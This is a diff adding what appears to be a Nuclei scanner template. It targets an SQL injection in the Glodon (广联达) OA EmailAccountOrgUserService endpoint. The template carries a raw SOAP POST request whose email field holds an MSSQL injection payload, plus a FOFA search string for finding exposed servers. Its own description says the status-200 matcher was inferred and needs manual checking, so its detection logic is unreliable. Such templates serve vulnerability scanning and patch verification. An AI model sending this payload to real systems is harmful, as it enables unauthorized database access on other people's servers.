@@ -1,0 +1,49 @@
+id: poc-5ce00059b1b932b27965
+info:
+  name: 广联达OAEmailAccountOrgUserServiceSQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/5ce00059b1b932b279653d184d481f0a
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 5ce00059b1b932b279653d184d481f0a
+    fofa: + app.name="广联达 OA"
+http:
+- raw:
+  - 'POST /Mail/Services/EmailAccountOrgUserService.asmx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: text/xml; charset=utf-8
+
+    Content-Length: length
+
+    SOAPAction: "http://tempuri.org/GetUserInfosByEmail"
+
+
+    <?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <GetUserInfosByEmail xmlns="http://tempuri.org/">
+
+    <email>'') AND 3515 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (3515=3515) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(122)+CHAR(113))) AND (''ShLa''=''ShLa</email>
+
+
+    </GetUserInfosByEmail>
+
+
+    </soap:Body>
+
+
+    </soap:Envelope>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
